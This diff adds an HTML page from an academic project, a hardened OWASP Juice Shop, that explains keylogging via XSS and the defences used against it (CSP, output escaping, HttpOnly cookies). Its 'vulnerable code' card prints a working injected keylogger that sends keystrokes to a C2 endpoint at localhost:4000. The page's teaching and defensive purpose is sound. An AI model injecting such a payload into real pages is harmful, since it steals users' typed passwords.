@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Keylogger XSS — Juice Shop Seguro</title>
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+  <header>
+    <div class="header-inner">
+      <div class="logo">
+        🥤 <span>OWASP Juice Shop</span>
+        <span class="badge-secure">🔒 VERSÃO SEGURA</span>
+      </div>
+      <nav>
+        <a href="/">Início</a>
+        <a href="/search?q=">Busca</a>
+        <a href="/reviews">Avaliações</a>
+        <a href="/dom">DOM</a>
+        <a href="/keylog">Keylogger</a>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <div class="page-title">
+      <div>
+        <h1>⌨️ Keylogger via XSS</h1>
+        <p>Captura de teclas por script injetado — bloqueada antes de a captura existir</p>
+      </div>
+      <span class="xss-type-badge">KEYLOGGER</span>
+    </div>
+
+    <div class="dom-demo">
+      <h2 style="color:#1b5e20;margin-bottom:12px;font-size:1.05rem">Simulação de Login</h2>
+      <p>
+        Digite algo nos campos abaixo como se estivesse fazendo login. No ambiente
+        <strong>vulnerável</strong>, um payload XSS instalaria um listener
+        <code>keydown</code> e enviaria cada tecla ao C2 (<code>localhost:4000</code>).
+        Aqui, esse payload <strong>nunca executa</strong> — então não há keylogger para
+        capturar nada. O contador abaixo mostra apenas o que <em>seria</em> roubado,
+        sem nenhum envio à rede.
+      </p>
+
+      <div class="form-group">
+        <label for="kl-email">E-mail</label>
+        <input type="email" id="kl-email" placeholder="vitima@email.com" autocomplete="off">
+      </div>
+      <div class="form-group">
+        <label for="kl-pass">Senha</label>
+        <input type="password" id="kl-pass" placeholder="digite uma senha de teste" autocomplete="off">
+      </div>
+
+      <label>Status do keylogger:</label>
+      <div id="kl-status" class="dom-output">Nenhum keylogger ativo — payload XSS bloqueado pelo CSP.</div>
+      <div class="url-demo">Teclas que um atacante teria capturado: <span id="kl-count">0</span> &nbsp;|&nbsp; Enviadas ao C2: <span id="kl-sent">0</span></div>
+    </div>
+
+    <section>
+      <h2>Comparação: Vulnerável vs Seguro</h2>
+      <div class="compare-grid">
+        <div class="compare-card danger">
+          <h3>❌ Código Vulnerável (:3000)</h3>
+          <pre class="code-block">// XSS injetado executa este script:
+&lt;iframe src="javascript:(function(){
+  var b='';
+  top.document.addEventListener('keydown',function(e){
+    b += e.key;                 // acumula cada tecla
+    if(b.length &gt; 30){          // a cada 30 chars...
+      fetch('http://localhost:4000/capture',{
+        method:'POST', mode:'no-cors',
+        body: JSON.stringify({type:'keylog', keylog:b})
+      });                       // → envia ao C2
+      b='';
+    }
+  });
+})()"&gt;</pre>
+          <p>O script injetado registra um listener global e exfiltra senhas em tempo real enquanto a vítima digita.</p>
+        </div>
+        <div class="compare-card safe">
+          <h3>✅ Código Seguro (este ambiente)</h3>
+          <pre class="code-block">// 1) O &lt;iframe javascript:&gt; é ESCAPADO na saída
+//    (escapeHtml) → vira texto, não tag.
+// 2) Mesmo se passasse, o CSP barra a execução:
+//    Content-Security-Policy: script-src 'self'
+//    → bloqueia inline e o esquema javascript:
+// 3) Sem execução, NENHUM addEventListener é
+//    registrado. Não existe keylogger.
+
+// Este arquivo (keylog-safe.js) é servido de
+// 'self' e apenas CONTA teclas localmente,
+// sem nenhum fetch() para a rede.</pre>
+          <p>A defesa não "limpa" as teclas: ela impede que o código que capturaria as teclas chegue a rodar.</p>
+        </div>
+      </div>
+    </section>
+
+    <div class="security-panel">
+      <h2>🛡️ Defesas Aplicadas Aqui</h2>
+      <div class="defense-list">
+        <div class="defense-item">
+          <span class="check">✅</span>
+          <div class="defense-info">
+            <strong>CSP <code>script-src 'self'</code></strong>
+            <span>Bloqueia scripts inline e o esquema <code>javascript:</code> — o payload do keylogger nunca executa.</span>
+          </div>
+        </div>
+        <div class="defense-item">
+          <span class="check">✅</span>
+          <div class="defense-info">
+            <strong>Escape de Saída (Output Encoding)</strong>
+            <span>O <code>&lt;iframe&gt;</code> que entregaria o keylogger é convertido em texto antes de chegar ao HTML.</span>
+            <pre class="code-block">function escapeHtml(str) {
+  return String(str)                    // ① garante que é texto
+    .replace(/&amp;/g, '&amp;amp;')             // ② troca  &amp;  por  &amp;amp;
+    .replace(/&lt;/g, '&amp;lt;')              // ③ troca  &lt;  por  &amp;lt;
+    .replace(/&gt;/g, '&amp;gt;')              // ④ troca  &gt;  por  &amp;gt;
+    .replace(/"/g, '&amp;quot;')            // ⑤ troca  "  por  &amp;quot;
+    .replace(/'/g, '&amp;#x27;');           // ⑥ troca  '  por  &amp;#x27;
+}</pre>
+          </div>
+        </div>
+        <div class="defense-item">
+          <span class="check">✅</span>
+          <div class="defense-info">
+            <strong>Cookie HttpOnly (defesa em profundidade)</strong>
+            <span>Ainda que algo executasse, <code>document.cookie</code> não expõe a sessão para acompanhar as teclas.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    <p>Projeto Acadêmico — Segurança de Sistemas &nbsp;|&nbsp; OWASP Juice Shop Seguro</p>
+  </footer>
+
+  <script src="/keylog-safe.js"></script>
+</body>
+</html>
